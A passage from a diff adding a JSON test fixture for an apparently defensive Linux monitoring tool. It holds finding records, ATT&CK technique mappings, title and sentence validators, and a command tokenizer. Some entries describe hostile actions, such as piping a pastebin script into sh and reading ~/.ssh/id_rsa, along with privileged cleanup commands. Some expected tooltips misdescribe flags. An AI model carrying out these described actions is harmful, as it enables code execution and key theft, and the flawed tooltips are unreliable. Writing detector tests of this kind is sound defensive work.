+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Läuft überall",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "name": "unicode subject",
+   "out": {
+    "attack": [
+     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "execution",
+      "url": "https://attack.mitre.org/techniques/T1059/004/"
+     },
+     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+     }
+    ],
+    "check": "pipe_to_shell",
+    "confidence": {
+     "level": "High",
+     "reason": "Running downloaded code is rarely needed."
+    },
+    "evidence": [],
+    "fixes": null,
+    "format": 1,
+    "id": "ffd5c15b00d12556",
+    "iocs": [],
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     {
+      "kind": null,
+      "strength": 0.9,
+      "text": "curl output piped into sh"
+     }
+    ],
+    "source": {
+     "check": "pipe_to_shell",
+     "data": "PKGBUILD line 12",
+     "tool": "pkg",
+     "when": 1000.0
+    },
+    "subject": "/home/ü/файл",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [],
+    "technical": [],
+    "title": "Läuft überall",
+    "tool": "pkg"
+   }
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "Low",
+    "confidence_reason": "",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "Medium",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "name": "medium",
+   "out": {
+    "attack": [
+     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "execution",
+      "url": "https://attack.mitre.org/techniques/T1059/004/"
+     },
+     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+     }
+    ],
+    "check": "pipe_to_shell",
+    "confidence": {
+     "level": "Low",
+     "reason": ""
+    },
+    "evidence": [],
+    "fixes": null,
+    "format": 1,
+    "id": "45bc9402e17ca319",
+    "iocs": [],
+    "likely": "Malware or a careless packager.",
+    "severity": "Medium",
+    "signals": [
+     {
+      "kind": null,
+      "strength": 0.9,
+      "text": "curl output piped into sh"
+     }
+    ],
+    "source": {
+     "check": "pipe_to_shell",
+     "data": "PKGBUILD line 12",
+     "tool": "pkg",
+     "when": 1000.0
+    },
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [],
+    "technical": [],
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg"
+   }
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": null,
+    "severity": "Info",
+    "signals": [],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "name": "info no likely",
+   "out": {
+    "attack": [
+     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "execution",
+      "url": "https://attack.mitre.org/techniques/T1059/004/"
+     },
+     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+     }
+    ],
+    "check": "pipe_to_shell",
+    "confidence": {
+     "level": "High",
+     "reason": "Running downloaded code is rarely needed."
+    },
+    "evidence": [],
+    "fixes": null,
+    "format": 1,
+    "id": "45bc9402e17ca319",
+    "iocs": [],
+    "likely": null,
+    "severity": "Info",
+    "signals": [],
+    "source": {
+     "check": "pipe_to_shell",
+     "data": "PKGBUILD line 12",
+     "tool": "pkg",
+     "when": 1000.0
+    },
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [],
+    "technical": [],
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg"
+   }
+  }
+ ],
+ "one_sentence": {
+  "": false,
+  "  ": false,
+  "Approx. 5 MB was sent.": true,
+  "Done.  ": true,
+  "Ends with an etc. And more.": true,
+  "First sentence! Second sentence.": false,
+  "Hello? World.": false,
+  "Is this a question?": true,
+  "It downloads install.sh from paste.example and runs it.": true,
+  "It reads ~/.ssh/id_rsa now.": true,
+  "It talks to example.com. Then stops.": false,
+  "Mixed 3.5x faster.": true,
+  "Mr. Smith arrived.": false,
+  "No full stop": false,
+  "No. 5 is here.": true,
+  "One. Two.": false,
+  "See i.e. this one.": true,
+  "The archive expands to 1.5 GB, e.g. from a tiny file.": true,
+  "The file a.tar.gz grew.": true,
+  "Two sentences here. Another one.": false,
+  "Version 2.0 is out.": true,
+  "Wow!": true,
+  "lower. case next.": true,
+  "vs. them, it won.": true
+ },
+ "os_release": {
+  "arch": [
+   {
+    "BUILD_ID": "rolling",
+    "ID": "arch",
+    "NAME": "Arch Linux",
+    "PRETTY_NAME": "Arch Linux"
+   },
+   "arch"
+  ],
+  "fedora": [
+   {
+    "ID": "fedora",
+    "NAME": "Fedora Linux",
+    "PRETTY_NAME": "Fedora Linux 41 (Workstation Edition)",
+    "VERSION": "41 (Workstation Edition)",
+    "VERSION_ID": "41"
+   },
+   "fedora"
+  ],
+  "opensuse": [
+   {
+    "ID": "opensuse-tumbleweed",
+    "ID_LIKE": "opensuse suse",
+    "NAME": "openSUSE Tumbleweed",
+    "PRETTY_NAME": "openSUSE Tumbleweed"
+   },
+   "suse"
+  ],
+  "ubuntu": [
+   {
+    "ID": "ubuntu",
+    "ID_LIKE": "debian",
+    "NAME": "Ubuntu",
+    "PRETTY_NAME": "Ubuntu 24.04 LTS"
+   },
+   "debian"
+  ],
+  "unknown": [
+   {
+    "ID": "mystery",
+    "NAME": "Mystery OS"
+   },
+   null
+  ]
+ },
+ "owner_check": {
+  "arch": {
+   "commands": [
+    {
+     "text": "pacman -Qo /usr/bin/x",
+     "tokens": [
+      {
+       "family": "arch",
+       "role": "pkgmgr",
+       "text": "pacman",
+       "tip": "pacman, Arch Linux's package manager."
+      },
+      {
+       "role": "flag",
+       "text": "-Qo",
+       "tip": "-Q queries the installed-package database (read-only); o asks who owns a file."
+      },
+      {
+       "role": "path",
+       "text": "/usr/bin/x",
+       "tip": "A file or folder path."
+      }
+     ]
+    }
+   ],
+   "risk": "safe",
+   "risk_label": "Safe (read-only)",
+   "title": "Which package installed this file?",
+   "undo": [],
+   "what": "Asks Arch Linux's package database who owns /usr/bin/x. If nothing owns it, it was installed by hand or by something else."
+  },
+  "fedora": {
+   "commands": [
+    {
+     "text": "rpm -qf /usr/bin/x",
+     "tokens": [
+      {
+       "family": "rpm",
+       "role": "pkgmgr",
+       "text": "rpm",
+       "tip": "rpm, the RPM package database (Fedora, openSUSE)."
+      },
+      {
+       "role": "flag",
+       "text": "-qf",
+       "tip": "-q queries the package database (read-only); f asks who owns a file."
+      },
+      {
+       "role": "path",
+       "text": "/usr/bin/x",
+       "tip": "A file or folder path."
+      }
+     ]
+    }
+   ],
+   "risk": "safe",
+   "risk_label": "Safe (read-only)",
+   "title": "Which package installed this file?",
+   "undo": [],
+   "what": "Asks Fedora's package database who owns /usr/bin/x. If nothing owns it, it was installed by hand or by something else."
+  },
+  "opensuse": {
+   "commands": [
+    {
+     "text": "rpm -qf /usr/bin/x",
+     "tokens": [
+      {
+       "family": "rpm",
+       "role": "pkgmgr",
+       "text": "rpm",
+       "tip": "rpm, the RPM package database (Fedora, openSUSE)."
+      },
+      {
+       "role": "flag",
+       "text": "-qf",
+       "tip": "-q queries the package database (read-only); f asks who owns a file."
+      },
+      {
+       "role": "path",
+       "text": "/usr/bin/x",
+       "tip": "A file or folder path."
+      }
+     ]
+    }
+   ],
+   "risk": "safe",
+   "risk_label": "Safe (read-only)",
+   "title": "Which package installed this file?",
+   "undo": [],
+   "what": "Asks openSUSE's package database who owns /usr/bin/x. If nothing owns it, it was installed by hand or by something else."
+  },
+  "ubuntu": {
+   "commands": [
+    {
+     "text": "dpkg -S /usr/bin/x",
+     "tokens": [
+      {
+       "family": "debian",
+       "role": "pkgmgr",
+       "text": "dpkg",
+       "tip": "dpkg, the Debian package database."
+      },
+      {
+       "role": "flag",
+       "text": "-S",
+       "tip": "-S searches which package owns a file (read-only)."
+      },
+      {
+       "role": "path",
+       "text": "/usr/bin/x",
+       "tip": "A file or folder path."
+      }
+     ]
+    }
+   ],
+   "risk": "safe",
+   "risk_label": "Safe (read-only)",
+   "title": "Which package installed this file?",
+   "undo": [],
+   "what": "Asks Debian / Ubuntu's package database who owns /usr/bin/x. If nothing owns it, it was installed by hand or by something else."
+  },
+  "unknown": {
+   "commands": [],
+   "risk": "safe",
+   "risk_label": "Safe (read-only)",
+   "title": "Which package installed this file?",
+   "undo": [],
+   "what": "Vigil could not tell your distro from /etc/os-release, so it cannot show the right command. Ask your package manager which package owns /usr/bin/x."
+  }
+ },
+ "owner_name": [
+  [
+   "AMAZON-02",
+   "Amazon AWS"
+  ],
+  [
+   "Google LLC",
+   "Google"
+  ],
+  [
+   "HETZNER-AS",
+   "Hetzner"
+  ],
+  [
+   "Some Company",
+   "Some"
+  ],
+  [
+   "ACME-NET",
+   "Acme"
+  ],
+  [
+   "acmecorp",
+   "Acmecorp"
+  ],
+  [
+   "ExampleNet-AS64500",
+   "ExampleNet"
+  ],
+  [
+   "",
+   null
+  ],
+  [
+   null,
+   null
+  ],
+  [
+   "MyISP-ASN",
+   "MyISP"
+  ],
+  [
+   "Deutsche Telekom AG",
+   "Deutsche"
+  ],
+  [
+   "COMCAST-7922",
+   "Comcast"
+  ],
+  [
+   "Mixed-Case-Co",
+   "Mixed-Case-Co"
+  ]
+ ],
+ "short_host": {
+  "*.cdn.example.net": "cdn.example.net",
+  "Example.COM": "example.com",
+  "a.b.c.d.e.f.g.h.example.com": "example.com",
+  "a.very.long.subdomain.of.something.example.org": "example.org",
+  "short.io": "short.io",
+  "www.example.com": "example.com"
+ },
+ "span": {
+  "0": [
+   "0 s",
+   "0 s"
+  ],
+  "100": [
+   "2 min",
+   "2 min"
+  ],
+  "12": [
+   "12 s",
+   "12 s"
+  ],
+  "3": [
+   "3 s",
+   "3 s"
+  ],
+  "3299": [
+   "55 min",
+   "55 min"
+  ],
+  "3300": [
+   "55 min",
+   "55 min"
+  ],
+  "3600": [
+   "1 h",
+   "1 hour"
+  ],
+  "36000": [
+   "10 hours",
+   "10 hours"
+  ],
+  "420": [
+   "7 min",
+   "7 min"
+  ],
+  "5399": [
+   "1 h 29 min",
+   "1 hour"
+  ],
+  "54": [
+   "54 s",
+   "54 s"
+  ],
+  "5400": [
+   "1 h 30 min",
+   "1 hour"
+  ],
+  "55": [
+   "55 s",
+   "55 s"
+  ],
+  "60": [
+   "60 s",
+   "60 s"
+  ],
+  "7": [
+   "7 s",
+   "7 s"
+  ],
+  "7200": [
+   "2 h",
+   "2 hours"
+  ],
+  "86400": [
+   "24 hours",
+   "24 hours"
+  ],
+  "89": [
+   "89 s",
+   "89 s"
+  ],
+  "90": [
+   "2 min",
+   "2 min"
+  ]
+ },
+ "tactics": [
+  "initial-access",
+  "execution",
+  "persistence",
+  "privilege-escalation",
+  "defense-evasion",
+  "credential-access",
+  "discovery",
+  "lateral-movement",
+  "collection",
+  "command-and-control",
+  "exfiltration",
+  "impact"
+ ],
+ "techniques": {
+  "T1005": [
+   "Data from Local System",
+   "collection"
+  ],
+  "T1027": [
+   "Obfuscated Files or Information",
+   "defense-evasion"
+  ],
+  "T1027.006": [
+   "Obfuscated Files or Information: HTML Smuggling",
+   "defense-evasion"
+  ],
+  "T1027.009": [
+   "Obfuscated Files or Information: Embedded Payloads",
+   "defense-evasion"
+  ],
+  "T1027.013": [
+   "Obfuscated Files or Information: Encrypted/Encoded File",
+   "defense-evasion"
+  ],
+  "T1029": [
+   "Scheduled Transfer",
+   "exfiltration"
+  ],
+  "T1036.002": [
+   "Masquerading: Right-to-Left Override",
+   "defense-evasion"
+  ],
+  "T1036.004": [
+   "Masquerading: Masquerade Task or Service",
+   "defense-evasion"
+  ],
+  "T1036.005": [
+   "Masquerading: Match Legitimate Name or Location",
+   "defense-evasion"
+  ],
+  "T1036.007": [
+   "Masquerading: Double File Extension",
+   "defense-evasion"
+  ],
+  "T1036.008": [
+   "Masquerading: Masquerade File Type",
+   "defense-evasion"
+  ],
+  "T1037.004": [
+   "Boot or Logon Initialization Scripts: RC Scripts",
+   "persistence"
+  ],
+  "T1053.003": [
+   "Scheduled Task/Job: Cron",
+   "persistence"
+  ],
+  "T1053.006": [
+   "Scheduled Task/Job: Systemd Timers",
+   "persistence"
+  ],
+  "T1059.001": [
+   "Command and Scripting Interpreter: PowerShell",
+   "execution"
+  ],
+  "T1059.004": [
+   "Command and Scripting Interpreter: Unix Shell",
+   "execution"
+  ],
+  "T1059.005": [
+   "Command and Scripting Interpreter: Visual Basic",
+   "execution"
+  ],
+  "T1059.007": [
+   "Command and Scripting Interpreter: JavaScript",
+   "execution"
+  ],
+  "T1070.004": [
+   "Indicator Removal: File Deletion",
+   "defense-evasion"
+  ],
+  "T1071.001": [
+   "Application Layer Protocol: Web Protocols",
+   "command-and-control"
+  ],
+  "T1095": [
+   "Non-Application Layer Protocol",
+   "command-and-control"
+  ],
+  "T1098": [
+   "Account Manipulation",
+   "persistence"
+  ],
+  "T1098.004": [
+   "Account Manipulation: SSH Authorized Keys",
+   "persistence"
+  ],
+  "T1102": [
+   "Web Service",
+   "command-and-control"
+  ],
+  "T1105": [
+   "Ingress Tool Transfer",
+   "command-and-control"
+  ],
+  "T1136.001": [
+   "Create Account: Local Account",
+   "persistence"
+  ],
+  "T1140": [
+   "Deobfuscate/Decode Files or Information",
+   "defense-evasion"
+  ],
+  "T1195.001": [
+   "Compromise Software Dependencies and Development Tools",
+   "initial-access"
+  ],
+  "T1195.002": [
+   "Compromise Software Supply Chain",
+   "initial-access"
+  ],
+  "T1203": [
+   "Exploitation for Client Execution",
+   "execution"
+  ],
+  "T1204.002": [
+   "User Execution: Malicious File",
+   "execution"
+  ],
+  "T1218": [
+   "System Binary Proxy Execution",
+   "defense-evasion"
+  ],
+  "T1221": [
+   "Template Injection",
+   "defense-evasion"
+  ],
+  "T1222.002": [
+   "File and Directory Permissions Modification: Linux and Mac",
+   "defense-evasion"
+  ],
+  "T1505.003": [
+   "Server Software Component: Web Shell",
+   "persistence"
+  ],
+  "T1528": [
+   "Steal Application Access Token",
+   "credential-access"
+  ],
+  "T1539": [
+   "Steal Web Session Cookie",
+   "credential-access"
+  ],
+  "T1543.002": [
+   "Create or Modify System Process: Systemd Service",
+   "persistence"
+  ],
+  "T1546.004": [
+   "Event Triggered Execution: Unix Shell Configuration Modification",
+   "persistence"
+  ],
+  "T1546.016": [
+   "Event Triggered Execution: Installer Packages",
+   "persistence"
+  ],
+  "T1546.017": [
+   "Event Triggered Execution: Udev Rules",
+   "persistence"
+  ],
+  "T1547.006": [
+   "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
+   "persistence"
+  ],
+  "T1547.013": [
+   "Boot or Logon Autostart Execution: XDG Autostart Entries",
+   "persistence"
+  ],
+  "T1548.001": [
+   "Abuse Elevation Control Mechanism: Setuid and Setgid",
+   "privilege-escalation"
+  ],
+  "T1548.003": [
+   "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+   "privilege-escalation"
+  ],
+  "T1552.001": [
+   "Unsecured Credentials: Credentials In Files",
+   "credential-access"
+  ],
+  "T1552.004": [
+   "Unsecured Credentials: Private Keys",
+   "credential-access"
+  ],
+  "T1555": [
+   "Credentials from Password Stores",
+   "credential-access"
+  ],
+  "T1555.003": [
+   "Credentials from Password Stores: Credentials from Web Browsers",
+   "credential-access"
+  ],
+  "T1555.005": [
+   "Credentials from Password Stores: Password Managers",
+   "credential-access"
+  ],
+  "T1556.003": [
+   "Modify Authentication Process: Pluggable Authentication Modules",
+   "credential-access"
+  ],
+  "T1559.002": [
+   "Inter-Process Communication: Dynamic Data Exchange",
+   "execution"
+  ],
+  "T1562.001": [
+   "Impair Defenses: Disable or Modify Tools",
+   "defense-evasion"
+  ],
+  "T1562.004": [
+   "Impair Defenses: Disable or Modify System Firewall",
+   "defense-evasion"
+  ],
+  "T1564.001": [
+   "Hide Artifacts: Hidden Files and Directories",
+   "defense-evasion"
+  ],
+  "T1564.003": [
+   "Hide Artifacts: Hidden Window",
+   "defense-evasion"
+  ],
+  "T1571": [
+   "Non-Standard Port",
+   "command-and-control"
+  ],
+  "T1574.006": [
+   "Hijack Execution Flow: Dynamic Linker Hijacking",
+   "persistence"
+  ],
+  "T1620": [
+   "Reflective Code Loading",
+   "defense-evasion"
+  ]
+ },
+ "title_problems": {
+  "": [
+   "empty"
+  ],
+  "   ": [
+   "empty"
+  ],
+  "::": [
+   "contains a raw IPv6 address"
+  ],
+  "At 12:30:45 it ran": [],
+  "Coefficient high": [
+   "uses 'coefficient'"
+  ],
+  "Downloads and runs a script from a pastebin": [],
+  "EDR says hi": [
+   "jargon 'edr'"
+  ],
+  "Ends with dot .": [
+   "ends with a full stop"
+  ],
+  "Ends with question?": [],
+  "Exfil over DNS": [
+   "jargon 'exfil'"
+  ],
+  "Firefox talks to Google": [],
+  "Heuristic flags": [
+   "jargon 'heuristic'"
+  ],
+  "High entropy payload": [
+   "jargon 'entropy'",
+   "jargon 'payload'"
+  ],
+  "IOC list": [
+   "jargon 'ioc'"
+  ],
+  "Low CV on this one": [
+   "uses 'cv'"
+  ],
+  "Läuft überall": [],
+  "Polls a server": [
+   "uses 'polls'"
+  ],
+  "Ratio 1:2:3 seen": [],
+  "Runs ::ffff:192.0.2.1 here": [
+   "contains a raw IPv6 address"
+  ],
+  "Something happened.": [
+   "ends with a full stop"
+  ],
+  "Starts at 10:30 every day": [],
+  "TTP match": [
+   "jargon 'ttp'"
+  ],
+  "Talks to 2001:db8::5 every hour": [
+   "contains a raw IPv6 address"
+  ],
+  "Talks to ::1 now": [
+   "contains a raw IPv6 address"
+  ],
+  "Talks to fe80::1%eth0": [
+   "uses '%'",
+   "contains a raw IPv6 address"
+  ],
+  "The payload's size": [
+   "jargon 'payload'"
+  ],
+  "Uses 100% of the CPU": [
+   "uses '%'"
+  ],
+  "Variation is low": [
+   "uses 'variation'"
+  ],
+  "a regex was used": [
+   "jargon 'regex'"
+  ],
+  "a:b:c": [],
+  "beacon.py checks in with this PC every ~10 s": [],
+  "c2 server found": [
+   "jargon 'c2'"
+  ],
+  "check-ins every hour": [
+   "uses 'check-ins'"
+  ],
+  "cv": [
+   "uses 'cv'"
+  ],
+  "deadbeef:cafe::1 talks": [],
+  "exfiltration over DNS": [],
+  "poll": [
+   "uses 'poll'"
+  ],
+  "stdev is small": [
+   "uses 'stdev'"
+  ],
+  "stdout shown": [
+   "jargon 'stdout'"
+  ],
+  "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx": [],
+  "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx": [
+   "longer than 60 characters"
+  ],
+  "±5": [
+   "uses '±'"
+  ]
+ },
+ "tokenize": {
+  "\"quoted cmd\" arg": [
+   {
+    "role": "command",
+    "text": "\"quoted cmd\"",
+    "tip": "The program \"quoted cmd\"."
+   },
+   {
+    "role": "arg",
+    "text": "arg",
+    "tip": "An argument for the command."
+   }
+  ],
+  "apk info --who-owns /x": [
+   {
+    "family": "alpine",
+    "role": "pkgmgr",
+    "text": "apk",
+    "tip": "apk, Alpine Linux's package manager."
+   },
+   {
+    "role": "flag",
+    "text": "info",
+    "tip": "Queries installed packages (read-only)."
+   },
+   {
+    "role": "flag",
+    "text": "--who-owns",
+    "tip": "An option that changes how the command behaves."
+   },
+   {
+    "role": "path",
+    "text": "/x",
+    "tip": "A file or folder path."
+   }
+  ],
+  "cat /etc/ssh/sshd_config": [
+   {
+    "role": "command",
+    "text": "cat",
+    "tip": "cat prints a file"
+   },
+   {
+    "role": "path",
+    "text": "/etc/ssh/sshd_config",
+    "tip": "A file or folder path."
+   }
+  ],
+  "dnf5 install y": [
+   {
+    "family": "fedora",
+    "role": "pkgmgr",
+    "text": "dnf5",
+    "tip": "dnf5, Fedora's package manager."
+   },
+   {
+    "role": "install",
+    "text": "install",
+    "tip": "install installs the packages named after it."
+   },
+   {
+    "role": "package",
+    "text": "y",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "doas apk add x": [
+   {
+    "role": "admin",
+    "text": "doas",
+    "tip": "Runs the rest as administrator (root)."
+   },
+   {
+    "family": "alpine",
+    "role": "pkgmgr",
+    "text": "apk",
+    "tip": "apk, Alpine Linux's package manager."
+   },
+   {
+    "role": "install",
+    "text": "add",
+    "tip": "add installs the packages named after it."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "doas apk del x": [
+   {
+    "role": "admin",
+    "text": "doas",
+    "tip": "Runs the rest as administrator (root)."
+   },
+   {
+    "family": "alpine",
+    "role": "pkgmgr",
+    "text": "apk",
+    "tip": "apk, Alpine Linux's package manager."
+   },
+   {
+    "role": "remove",
+    "text": "del",
+    "tip": "del removes the packages named after it."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "dpkg --verify": [
+   {
+    "family": "debian",
+    "role": "pkgmgr",
+    "text": "dpkg",
+    "tip": "dpkg, the Debian package database."
+   },
+   {
+    "role": "flag",
+    "text": "--verify",
+    "tip": "An option that changes how the command behaves."
+   }
+  ],
+  "dpkg -S /usr/bin/x": [
+   {
+    "family": "debian",
+    "role": "pkgmgr",
+    "text": "dpkg",
+    "tip": "dpkg, the Debian package database."
+   },
+   {
+    "role": "flag",
+    "text": "-S",
+    "tip": "-S searches which package owns a file (read-only)."
+   },
+   {
+    "role": "path",
+    "text": "/usr/bin/x",
+    "tip": "A file or folder path."
+   }
+  ],
+  "equery belongs /x": [
+   {
+    "family": "gentoo",
+    "role": "pkgmgr",
+    "text": "equery",
+    "tip": "equery, Gentoo's package query tool."
+   },
+   {
+    "role": "flag",
+    "text": "belongs",
+    "tip": "Asks which package owns a file (read-only)."
+   },
+   {
+    "role": "path",
+    "text": "/x",
+    "tip": "A file or folder path."
+   }
+  ],
+  "flatpak uninstall --unused": [
+   {
+    "family": "flatpak",
+    "role": "pkgmgr",
+    "text": "flatpak",
+    "tip": "flatpak, the Flatpak app manager."
+   },
+   {
+    "role": "remove",
+    "text": "uninstall",
+    "tip": "uninstall removes the packages named after it."
+   },
+   {
+    "role": "flag",
+    "text": "--unused",
+    "tip": "An option that changes how the command behaves."
+   }
+  ],
+  "gsettings set org.gnome.software download-updates false": [
+   {
+    "role": "command",
+    "text": "gsettings",
+    "tip": "gsettings changes a GNOME setting"
+   },
+   {
+    "role": "arg",
+    "text": "set",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "org.gnome.software",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "download-updates",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "false",
+    "tip": "An argument for the command."
+   }
+  ],
+  "journalctl -u foo --since today": [
+   {
+    "role": "command",
+    "text": "journalctl",
+    "tip": "journalctl reads the system log"
+   },
+   {
+    "role": "flag",
+    "text": "-u",
+    "tip": "An option that changes how the command behaves."
+   },
+   {
+    "role": "arg",
+    "text": "foo",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "flag",
+    "text": "--since",
+    "tip": "An option that changes how the command behaves."
+   },
+   {
+    "role": "arg",
+    "text": "today",
+    "tip": "An argument for the command."
+   }
+  ],
+  "nmcli networking connectivity": [
+   {
+    "role": "command",
+    "text": "nmcli",
+    "tip": "nmcli, NetworkManager's command line"
+   },
+   {
+    "role": "arg",
+    "text": "networking",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "connectivity",
+    "tip": "An argument for the command."
+   }
+  ],
+  "pacman -Qi bash": [
+   {
+    "family": "arch",
+    "role": "pkgmgr",
+    "text": "pacman",
+    "tip": "pacman, Arch Linux's package manager."
+   },
+   {
+    "role": "flag",
+    "text": "-Qi",
+    "tip": "-Q queries the installed-package database (read-only); o asks who owns a file."
+   },
+   {
+    "role": "package",
+    "text": "bash",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "pacman -Qo /usr/bin/x": [
+   {
+    "family": "arch",
+    "role": "pkgmgr",
+    "text": "pacman",
+    "tip": "pacman, Arch Linux's package manager."
+   },
+   {
+    "role": "flag",
+    "text": "-Qo",
+    "tip": "-Q queries the installed-package database (read-only); o asks who owns a file."
+   },
+   {
+    "role": "path",
+    "text": "/usr/bin/x",
+    "tip": "A file or folder path."
+   }
+  ],
+  "pkexec rm /etc/ld.so.preload": [
+   {
+    "role": "admin",
+    "text": "pkexec",
+    "tip": "Asks for your password, then runs the rest as administrator (root)."
+   },
+   {
+    "role": "remove",
+    "text": "rm",
+    "tip": "rm deletes a file. It names one exact file here."
+   },
+   {
+    "role": "path",
+    "text": "/etc/ld.so.preload",
+    "tip": "A file or folder path."
+   }
+  ],
+  "rm '/tmp/a b'": [
+   {
+    "role": "remove",
+    "text": "rm",
+    "tip": "rm deletes a file. It names one exact file here."
+   },
+   {
+    "role": "path",
+    "text": "'/tmp/a b'",
+    "tip": "A file or folder path."
+   }
+  ],
+  "rm ~/.config/autostart/evil.desktop": [
+   {
+    "role": "remove",
+    "text": "rm",
+    "tip": "rm deletes a file. It names one exact file here."
+   },
+   {
+    "role": "path",
+    "text": "~/.config/autostart/evil.desktop",
+    "tip": "A file or folder path."
+   }
+  ],
+  "rpm -Va": [
+   {
+    "family": "rpm",
+    "role": "pkgmgr",
+    "text": "rpm",
+    "tip": "rpm, the RPM package database (Fedora, openSUSE)."
+   },
+   {
+    "role": "flag",
+    "text": "-Va",
+    "tip": "An option that changes how the command behaves."
+   }
+  ],
+  "rpm -qf /usr/bin/x": [
+   {
+    "family": "rpm",
+    "role": "pkgmgr",
+    "text": "rpm",
+    "tip": "rpm, the RPM package database (Fedora, openSUSE)."
+   },
+   {
+    "role": "flag",
+    "text": "-qf",
+    "tip": "-q queries the package database (read-only); f asks who owns a file."
+   },
+   {
+    "role": "path",
+    "text": "/usr/bin/x",
+    "tip": "A file or folder path."
+   }
+  ],
+  "rpm -qi bash": [
+   {
+    "family": "rpm",
+    "role": "pkgmgr",
+    "text": "rpm",
+    "tip": "rpm, the RPM package database (Fedora, openSUSE)."
+   },
+   {
+    "role": "flag",
+    "text": "-qi",
+    "tip": "-q queries the package database (read-only); f asks who owns a file."
+   },
+   {
+    "role": "package",
+    "text": "bash",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "sha256sum ./x": [
+   {
+    "role": "command",
+    "text": "sha256sum",
+    "tip": "The program sha256sum."
+   },
+   {
+    "role": "path",
+    "text": "./x",
+    "tip": "A file or folder path."
+   }
+  ],
+  "ss -tnp": [
+   {
+    "role": "command",
+    "text": "ss",
+    "tip": "ss lists network connections"
+   },
+   {
+    "role": "flag",
+    "text": "-tnp",
+    "tip": "An option that changes how the command behaves."
+   }
+  ],
+  "su -c whoami": [
+   {
+    "role": "admin",
+    "text": "su",
+    "tip": "Switches to another user, normally root."
+   },
+   {
+    "role": "command",
+    "text": "-c",
+    "tip": "The program -c."
+   },
+   {
+    "role": "arg",
+    "text": "whoami",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo -u nobody id": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "-u",
+    "tip": "The program -u."
+   },
+   {
+    "role": "arg",
+    "text": "nobody",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "id",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo apt autoremove": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "debian",
+    "role": "pkgmgr",
+    "text": "apt",
+    "tip": "apt, Debian/Ubuntu's package manager."
+   },
+   {
+    "role": "remove",
+    "text": "autoremove",
+    "tip": "autoremove removes the packages named after it."
+   }
+  ],
+  "sudo apt clean": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "debian",
+    "role": "pkgmgr",
+    "text": "apt",
+    "tip": "apt, Debian/Ubuntu's package manager."
+   },
+   {
+    "role": "arg",
+    "text": "clean",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo apt remove x": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "debian",
+    "role": "pkgmgr",
+    "text": "apt",
+    "tip": "apt, Debian/Ubuntu's package manager."
+   },
+   {
+    "role": "remove",
+    "text": "remove",
+    "tip": "remove removes the packages named after it."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "sudo apt-get purge x": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
